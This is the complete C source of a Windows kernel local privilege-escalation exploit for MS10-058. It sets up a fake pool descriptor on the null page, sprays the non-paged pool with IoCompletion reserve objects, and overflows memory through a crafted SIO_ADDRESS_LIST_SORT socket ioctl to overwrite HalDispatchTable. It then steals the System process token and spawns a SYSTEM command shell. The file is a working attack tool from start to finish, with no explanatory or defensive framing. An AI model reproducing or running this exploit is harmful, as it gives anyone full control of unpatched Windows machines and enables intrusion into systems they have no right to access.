/*
Exploit for MS10-058
Jeremy Fetiveau
@__x86

Pool hit tag : 'oooo' 
*/

#include "stdafx.h"

using namespace std;

#define APC 0
#define IOCO 1

typedef struct {
    PVOID   Unknown1;
    PVOID   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS (__stdcall *NtAllocateReserveObject_t) (OUT PHANDLE hObject, IN POBJECT_ATTRIBUTES ObjectAttributes, IN DWORD ObjectType);
typedef NTSTATUS (__stdcall *NtQueueApcThreadEx_t)(IN HANDLE hThread, IN HANDLE hApcReserve, IN PVOID ApcRoutine, IN PVOID ApcArgument1, IN PVOID ApcArgument2, IN PVOID ApcArgument3);
typedef NTSTATUS (__stdcall *NtSetIoCompletionEx_t)(IN HANDLE IoCompletionHandle, IN HANDLE hReserveObject, IN PVOID KeyContext, IN PVOID ApcContext, IN NTSTATUS IoStatus, ULONG_PTR IoStatusInformation);
typedef NTSTATUS (__stdcall *NtCreateIoCompletion_t)(OUT PHANDLE IoCompletionHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN ULONG NumberOfConcurrentThreads); 
typedef NTSTATUS (__stdcall *NtAllocateVirtualMemory_t)(IN HANDLE ProcessHandle,IN OUT PVOID *BaseAddress,IN ULONG ZeroBits, IN OUT PULONG AllocationSize, IN ULONG AllocationType, IN ULONG Protect);
typedef NTSTATUS (__stdcall *NtQueryIntervalProfile_t)(UINT, PULONG);

NtAllocateReserveObject_t NtAllocateReserveObject;
NtQueueApcThreadEx_t NtQueueApcThreadEx;
NtSetIoCompletionEx_t NtSetIoCompletionEx;
NtCreateIoCompletion_t NtCreateIoCompletion;
NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
NtQueryIntervalProfile_t NtQueryIntervalProfile;

typedef PVOID (__stdcall *PsGetCurrentProcess_t)(VOID);
typedef ULONG (__cdecl *DbgPrint_t)(PCHAR Format, ...); 
typedef LONG (__stdcall *RtlCompareString_t)(IN STRING *Str1, IN STRING str2, IN BOOLEAN caseInsensitive);
typedef PVOID (__stdcall *MmGetSystemRoutineAddress_t)(IN PUNICODE_STRING SystemRoutineName);

PsGetCurrentProcess_t PsGetCurrentProcess;
DbgPrint_t DbgPrint;
RtlCompareString_t RtlCompareString;
MmGetSystemRoutineAddress_t MmGetSystemRoutineAddress;

HANDLE hObject[10000];
HANDLE hObjectA[5000];
HANDLE hObjectB[5000];

PCHAR current;
PCHAR saved_token;

PUCHAR hal;

void InitPoolDescriptor(PVOID WriteAddress)
{
	INT i = 0;

	RtlZeroMemory((PCHAR)0x0, 0x1140+0x100); 

	*(PCHAR)0x0 = 1;
	*(PCHAR)0x4 = 1;
	*(PCHAR*)0x100 = (PCHAR)0x1208; 
	*(PCHAR*)0x104 = (PCHAR)0x20;

	for (i = 0x140; i < 0x1140; i += 8) {
		*(PCHAR*)i = (PCHAR)WriteAddress-4;
	}

	*(PINT)0x1200 = (INT)0x060c0a00;
	*(PINT)0x1204 = (INT)0x6f6f6f6f;
	*(PCHAR*)0x1208 = (PCHAR)0x0;
	*(PINT)0x1260 = (INT)0x060c0a0c;
	*(PINT)0x1264 = (INT)0x6f6f6f6f;
}

/* 
+0x0b8 ActiveProcessLinks
+0x16c ImageFileName
+0xf8  Token
*/
void payload()
{
	INT i;
	PCHAR process = (PCHAR)PsGetCurrentProcess();
	current = process;
	UCHAR sys[] = "System";
	BOOLEAN found;
	UNICODE_STRING haliStr;
	DbgPrint("%s %x\n", process+0x16c, process);
	DbgPrint("%x\n", (*(PUCHAR*)(hal+0xb*4)) + 0x1d4);
	*(PUCHAR*)hal = (*(PUCHAR*)(hal+0xb*4)) + 0x1d4;
	while (1) {
		DbgPrint("%x\n", process);
		found = true;
		for (i = 0; i <= 6; ++i) {
			if (sys[i] != process[0x16c+i]) {
				found = false;
				break;
			}
		}
		if (found) {
			DbgPrint("Be ready\n");
			saved_token = *(PCHAR*)(current+0xf8);
			*(PCHAR*)(current+0xf8) = *(PCHAR*)(process+0xf8);
			DbgPrint("Stole system token\n");
			break;
		}
		process = process + 0xb8;
		process = (*(PCHAR*)process) - 0xb8;
		if (process == current)
			break;

	}
}

void setupPayload() 
{
	*(PUCHAR)0x1208 = 0xb8;
	*(PINT)0x1209 = (INT)payload; 
	*(PUCHAR)0x120D = 0xff;
	*(PUCHAR)0x120E = 0xd0;
	*(PUCHAR)0x120F = 0xc9;
	*(PUCHAR)0x1210 = 0xc3;
}

void AllocNullPage() 
{
	HMODULE h;
	HANDLE hProc;
	PVOID addr;
	ULONG size;
	NTSTATUS st;

	size = 4096;
	addr = (PVOID)1;
	h = LoadLibraryA("ntdll.dll");

	if (!h) {
		printf("[-]Failed to load module\n");
		exit(1);
	}

	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(h, "NtAllocateVirtualMemory");

	if (!NtAllocateVirtualMemory) {
		printf("[-]Failed to get the address of NtAllocateVirtualMemory %08x\n", GetLastError());
		exit(1);
	}

	hProc = GetCurrentProcess();

	if (!hProc) {
		printf("[-]Failed to get current process handle %08x\n", GetLastError());
		exit(1);
	}

	st = NtAllocateVirtualMemory(hProc, &addr, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!NT_SUCCESS(st)) {
		printf("[-]Failed to allocate null page %08x\n", GetLastError());
		exit(1);
	}
}

int sprayIoCo()
{
	NTSTATUS st;
	HMODULE h;
	INT i = 0;

	h = LoadLibraryA("ntdll.dll");

	if (!h) {
		printf("[-]Failed to load module\n");
		exit(1);
	}

	NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(h, "NtAllocateReserveObject");
	NtSetIoCompletionEx = (NtSetIoCompletionEx_t)GetProcAddress(h, "NtSetIoCompletionEx");
	NtCreateIoCompletion = (NtCreateIoCompletion_t)GetProcAddress(h, "NtCreateIoCompletion");

	if (!NtAllocateReserveObject) {
		printf("[-]Failed to get the address of NtAllocateReserveObject %08x\n", GetLastError());
		exit(1);
	}

	if (!NtSetIoCompletionEx) {
		printf("[-]Failed to get the address of NtSetIoCompletionEx %08x\n", GetLastError());
		exit(1);
	}

	if (!NtCreateIoCompletion) {
		printf("[-]Failed to get the address of NtCreateIoCompletion %08x\n", GetLastError());
		exit(1);
	}

	printf("[+]Spraying np pool with IoCo reserve objects 1/2\n");

	for (i = 0; i < 10000; ++i) {
		st = NtAllocateReserveObject(&hObject[i], 0, IOCO);
		if (!NT_SUCCESS(st)) {
			printf("[-]Failed to allocate on the pool, %08x %08x\n", GetLastError(),st);
			exit(1);
		}
	}

	printf("[+]Spraying np pool with IoCo reserve objects 2/2\n");

	for (i = 0; i < 5000; ++i) {
		st = NtAllocateReserveObject(&hObjectA[i], 0, IOCO);
		if (!NT_SUCCESS(st)) {
			printf("[-]Failed to allocate on the pool, %08x %08x\n", GetLastError(),st);
			exit(1);
		}

		st = NtAllocateReserveObject(&hObjectB[i], 0, IOCO);
		if (!NT_SUCCESS(st)) {
			printf("[-]Failed to allocate on the pool, %08x %08x\n", GetLastError(),st);
			exit(1);
		}

		if (!CloseHandle(hObjectA[i])) {
			printf("[-]Failed to close reserve object handle\n");
			exit(1);
		}
	}

	printf("[+]Done spraying\n");

	return 0;
}

void freeIoCo() 
{
	INT i = 0;
	for (i = 0; i < 10000; ++i) {
		if (!CloseHandle(hObject[i])) {
				printf("[-]Failed to close reserve object handle (_)\n");
		}
	}
	for (i = 0; i < 5000; ++i) {
		if (!CloseHandle(hObjectB[i])) {
				printf("[-]Failed to close reserve object handle (B)\n");
		}
	}

}

PVOID getHalAndMisc() 
{
	HMODULE h, kernel;
	PUCHAR hal;
	PVOID kernelBase;
	ULONG len;
	NTSTATUS st;
	PSYSTEM_MODULE_INFORMATION sysInfo;
	PCHAR kernelImage;

	h = LoadLibraryA("ntdll.dll");

	if (!h) {
		printf("[-]Failed to load module\n");
		exit(1);
	}

	st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, NULL, 0, &len);

	sysInfo = (PSYSTEM_MODULE_INFORMATION)malloc(len);

	if (!sysInfo) {
		printf("[-]Failed to allocate memory for system module information\n");
		exit(1);
	}

	st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, sysInfo, len, &len);

	if (!NT_SUCCESS(st)) {
		printf("[-]Failed to get system module informations\n");
		exit(1);
	}

	kernelBase = sysInfo->Module[0].Base;
	kernelImage = strrchr((char*)(sysInfo->Module[0].ImageName), '\\') + 1;
	 
	kernel = LoadLibraryA(kernelImage);
	if (!kernel) {
		printf("[-]Failed to load kernel base\n");
		exit(1);
	}

	hal = (PUCHAR)GetProcAddress(kernel, "HalDispatchTable");
	PsGetCurrentProcess = (PsGetCurrentProcess_t)GetProcAddress(kernel, "PsGetCurrentProcess");
	DbgPrint = (DbgPrint_t)GetProcAddress(kernel, "DbgPrint");
	RtlCompareString = (RtlCompareString_t)GetProcAddress(kernel, "RtlCompareString");
	MmGetSystemRoutineAddress = (MmGetSystemRoutineAddress_t)GetProcAddress(kernel, "MmGetSystemRoutineAddress");

	if (!hal) {
		printf("[-]Failed to find HalDispatchTable\n");
		exit(1);
	}
	if (!PsGetCurrentProcess) {
		printf("[-]Failed to find the address of PsGetCurrentProcess\n");
		exit(1);
	}
	if (!DbgPrint) {
		printf("[-]Failed to find the address of DbgPrint\n");
		exit(1);
	}
	if (!RtlCompareString) {
		printf("[-]Failed to find the address of RtlCompareString\n");
		exit(1);
	}
	if (!MmGetSystemRoutineAddress) {
		printf("[-]Failed to find the address of MmGetSystemRoutineAddress\n");
	}
	
	hal = (PUCHAR)hal - (PUCHAR)kernel + (PUCHAR)kernelBase;
	PsGetCurrentProcess = (PsGetCurrentProcess_t)((PUCHAR)PsGetCurrentProcess - (PUCHAR)kernel + (PUCHAR)kernelBase);
	DbgPrint = (DbgPrint_t)((PUCHAR)DbgPrint - (PUCHAR)kernel + (PUCHAR)kernelBase);
	RtlCompareString = (RtlCompareString_t)((PUCHAR)RtlCompareString - (PUCHAR)kernel + (PUCHAR)kernelBase);
	MmGetSystemRoutineAddress = (MmGetSystemRoutineAddress_t)((PUCHAR)MmGetSystemRoutineAddress - (PUCHAR)kernel + (PUCHAR)kernelBase);

	return (PVOID)((PUCHAR)hal + 4);
}

void callPayload()
{
	HMODULE h;
	ULONG foo;
	
	h = LoadLibraryA("ntdll.dll");

	if (!h) {
		printf("[-]Failed to load module\n");
		exit(1);
	}

	NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(h, "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile) {
		printf("[-]Failed to get the address of NtQueryIntervalProfile\n");
		exit(1);
	}

	NtQueryIntervalProfile(2, &foo);

}

void spawnShell()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

	 char str[] = "cmd";

    if( !CreateProcessA( NULL, 
        str,        
        NULL,         
        NULL,           
        TRUE,          
        CREATE_NEW_CONSOLE,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf("CreateProcess failed (%d).\n", GetLastError() );
        return;
    }
}

int main(void) 
{
	WSADATA wd = {0};
	SOCKET sock = 0;
	SOCKET_ADDRESS_LIST *pwn = (SOCKET_ADDRESS_LIST*)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
	DWORD cb;
	char buffer_name[30];
	DWORD len = 30;
	SOCKET_ADDRESS sa;
	CHAR buffer[0x1c];
	SOCKET_ADDRESS sa2;
	CHAR buffer2[0x1c] = "\x42\x42\x42\x42" "\x0c\x0a\x0c\x06" "\x6f\x6f\x6f\xef" "\x00\x00\x00\x00" "\x5c\x00\x00\x00" "\x00\x00\x00\x00" "\x00\x00\x00";
	int i = 0;

	memset(buffer,0x41,0x1c);
	buffer[0] = 0x17;
	buffer[1] = 0x00;
	sa.lpSockaddr = (LPSOCKADDR)buffer;
	sa.iSockaddrLength = 0x1c;

	sa2.lpSockaddr = (LPSOCKADDR)buffer2;
	sa2.iSockaddrLength = 0x1c;


	pwn->iAddressCount = 0x40000003;
	memcpy(&pwn->Address[0],&sa,sizeof(_SOCKET_ADDRESS));
	memcpy(&pwn->Address[1],&sa,sizeof(_SOCKET_ADDRESS));
	memcpy(&pwn->Address[2],&sa,sizeof(_SOCKET_ADDRESS));
	memcpy(&pwn->Address[3],&sa2,sizeof(_SOCKET_ADDRESS));

	AllocNullPage();
	printf("[+]Allocated null page\n");

	hal = (PUCHAR)getHalAndMisc();
	InitPoolDescriptor((PVOID)hal);
	printf("[+]Crafted fake pool descriptor\n");

	if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) {
		printf("[-]Failed to set high priority to attacker thread (%08x)\n", WSAGetLastError());
		exit(1);
	}

	if (WSAStartup(MAKEWORD(2,0), &wd)) {
		printf("[-]Failed to initialize winsock (%08x)\n", WSAGetLastError());
		exit(1);
	}

	sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (sock == INVALID_SOCKET) {
		printf("[-]Failed to create socket (%08x)\n", WSAGetLastError());
		exit(1);
	}

	sprayIoCo();

	if (WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &cb, NULL, NULL)) {
		printf("[+]IoCo overflowed (%d)\n", WSAGetLastError());
		freeIoCo();
		printf("[+]Vulnerable chunk released\n");
	}
	else {
		printf("[-]Failed to trigger vulnerability\n");
	}

	printf("[+]Triggered vulnerability!\n");

	setupPayload();

	printf("[+]Set-up payload\n");

	printf("[+]Calling payload ... \n");

	callPayload();

	printf("[+]Spawning system shell ...\n");

	GetUserNameA(buffer_name, &len);

	printf("You are now : %s\n", buffer_name);

	spawnShell();
}
